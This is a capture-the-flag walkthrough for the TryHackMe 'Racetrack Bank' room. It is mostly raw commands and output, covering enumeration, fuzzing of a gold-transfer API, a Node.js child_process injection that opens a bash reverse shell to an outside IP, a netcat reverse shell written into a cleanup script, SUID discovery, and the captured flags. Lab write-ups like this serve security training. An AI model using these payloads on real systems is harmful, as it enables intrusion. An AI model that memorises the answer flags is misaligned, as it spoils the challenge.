# Racetrack Bank

It's time for another heist.

[Racetrack Bank](https://tryhackme.com/room/racetrackbank)

- Network Enumeration
- Web Enumeration
- Code Injection
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck.

```
kali@kali:~/CTFs/tryhackme/Racetrack Bank$ sudo nmap -A -sS -sC -sV -O 10.10.44.102
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 15:58 CEST
Nmap scan report for 10.10.44.102
Host is up (0.034s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)
|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)
|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Racetrack Bank
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   33.95 ms 10.8.0.1
2   34.09 ms 10.10.44.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.17 seconds
```

```
kali@kali:~/CTFs/tryhackme/Racetrack Bank$ gobuster dir -u http://10.10.44.102/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.44.102/
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/10/20 16:00:27 Starting gobuster
===============================================================
/create.html (Status: 200)
/home.html (Status: 302)
/Home.html (Status: 302)
/images (Status: 301)
/Images (Status: 301)
/index.html (Status: 200)
/Index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/Login.html (Status: 200)
/purchase.html (Status: 302)
===============================================================
2020/10/20 16:01:01 Finished
===============================================================
```

[http://10.10.44.102/home.html](http://10.10.44.102/home.html)

wfuzz -w gold.txt -u http://10.10.44.102/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3A1_QrOdmwhf3pJserjzFqbCWZAqIYR8fv.vb7X%2BTckrABMYXkszRkdjHm59MnUjLGo9jPnfbBaCc0" -d "user=test2&amount=FUZZ"

wfuzz -w gold.txt -u http://10.10.44.102/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AdztpeWIe47gRM3QkNL6s1zBf_NqHY9eb.DErxWEyXCczE%2BYifpQ2t%2F7rMBpsh1AHZpTk73Z9yj6M" -d "user=test&amount=FUZZ"

[http://10.10.44.102/premiumfeatures.html?ans=2](http://10.10.44.102/premiumfeatures.html?ans=2)

`calculation=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.8.106.222/9001+0>%261"')`

```
brian@racetrack:~/website$ cd ~
cd ~
brian@racetrack:~$ ls -l
ls -l
total 16
drwxrwxr-x 3 root  root  4096 Apr 23 05:07 admin
drwxr-xr-x 2 brian brian 4096 Apr 23 04:55 cleanup
-rw-rw-r-- 1 brian brian   39 Apr 23 05:45 user.txt
drwxrwxr-x 6 brian brian 4096 Apr 22 09:41 website
brian@racetrack:~$ cat user.txt
cat user.txt
THM{178c31090a7e0f69560730ad21d90e70}
```

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9002 >/tmp/f' > cleanup/cleanupscript.sh
```

```
brian@racetrack:~$ find / -perm -4000 -user root -type f 2> /dev/null
find / -perm -4000 -user root -type f 2> /dev/null
/home/brian/admin/manageaccounts
```

```
brian@racetrack:~$ cat root_flag.txt
cat root_flag.txt
THM{55a9d6099933f6c456ccb2711b8766e3}
```

1. User flag

`THM{178c31090a7e0f69560730ad21d90e70}`

2. Root flag

`THM{55a9d6099933f6c456ccb2711b8766e3}`
